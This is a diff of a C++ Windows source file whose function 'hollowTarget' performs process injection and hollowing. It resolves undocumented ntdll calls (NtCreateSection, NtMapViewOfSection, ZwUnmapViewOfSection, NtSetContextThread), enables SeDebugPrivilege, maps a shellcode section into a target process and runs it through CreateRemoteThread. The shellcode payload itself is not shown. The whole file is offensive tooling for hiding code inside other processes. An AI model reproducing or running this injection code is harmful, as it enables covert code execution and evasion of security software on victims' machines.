@@ -1,7 +1,7 @@
 #include "pch.h"
 #include "define.h"
 #include "hklocal.h"
-#include "util/util.h"
+#include "hkutil.h"
 
 bool hk_local::hollowTarget(DWORD PID) noexcept {
   if (!PID) {
@@ -11,7 +11,8 @@ bool hk_local::hollowTarget(DWORD PID) noexcept {
   }
 
   // initialization
-  HANDLE hSection = NULL, hToken = NULL;
+  HANDLE hSection = NULL, hRThread = NULL;
+  DWORD idRThread = 0;
   LARGE_INTEGER sectionSize{};
   sectionSize.QuadPart = hk_util::shellCodeSize;
   LPVOID lpSectionLocal = nullptr, lpSectionTarget = nullptr;
@@ -28,13 +29,22 @@ bool hk_local::hollowTarget(DWORD PID) noexcept {
   TCreateSection hkCreateSection = (TCreateSection)hk_util::procAddr("ntdll", "NtCreateSection");
   TMapViewOfSection hkMapViewOfSection =
       (TMapViewOfSection)hk_util::procAddr("ntdll", "NtMapViewOfSection");
+  TUnmapViewOfSection hkUnmapViewOfSection =
+      (TUnmapViewOfSection)hk_util::procAddr("ntdll", "ZwUnmapViewOfSection");
+  TSetContextThread hkSetContextThread =
+      (TSetContextThread)hk_util::procAddr("ntdll", "NtSetContextThread");
   TGetContextThread hkGetContextThread =
       (TGetContextThread)hk_util::procAddr("ntdll", "NtGetContextThread");
   TQueryInformationProcess hkQueryInformationProcess =
       (TQueryInformationProcess)hk_util::procAddr("ntdll",
                                             "NtQueryInformationProcess");
+
+  // UNUSED
   TCreateUserThread hkCreateUserThread =
       (TCreateUserThread)hk_util::procAddr("ntdll", "RtlCreateUserThread");
+  TResumeProcess hkResumeProcess =
+      (TResumeProcess)hk_util::procAddr("ntdll", "NtResumeProcess");
+  //
 
   LOGn("Setting debug privilege...\t\t");
   if (hk_util::setLocalPrivilege("SeDebugPrivilege")) {  // unused right now
@@ -89,26 +99,22 @@ bool hk_local::hollowTarget(DWORD PID) noexcept {
 
   CloseHandle(hSection);
 
-  DWORD idThread = 0;
-  HANDLE hRThread = CreateRemoteThread(
-      procInfo.hProcess, nullptr, 0,
-                     (LPTHREAD_START_ROUTINE)lpSectionTarget, nullptr, 0,
-                     &idThread);
+  LOG("Executing shellcode at 0x" << std::hex << lpSectionTarget << ".");
 
-  HANDLE hUThread = NULL;
-  hkCreateUserThread(procInfo.hProcess, nullptr, false, 0, nullptr, nullptr,
-                     lpSectionTarget, nullptr, &hUThread, nullptr);
-
-  /*
+  hRThread = CreateRemoteThread(procInfo.hProcess, nullptr, 0,
+                                (LPTHREAD_START_ROUTINE)lpSectionTarget,
+                                nullptr, 0, &idRThread);
+  
   procContext.ContextFlags = CONTEXT_FULL;
   hkGetContextThread(procInfo.hThread, &procContext);
 
   hkQueryInformationProcess(procInfo.hProcess, ProcessBasicInformation,
                             &procBasicInfo, sizeof(PROCESS_BASIC_INFORMATION),
-                            &retLength);*/
+                            &retLength);
 
   // cleanup
   _getch();
+  CloseHandle(hRThread);
   TerminateProcess(procInfo.hProcess, 0);
 
   return true;
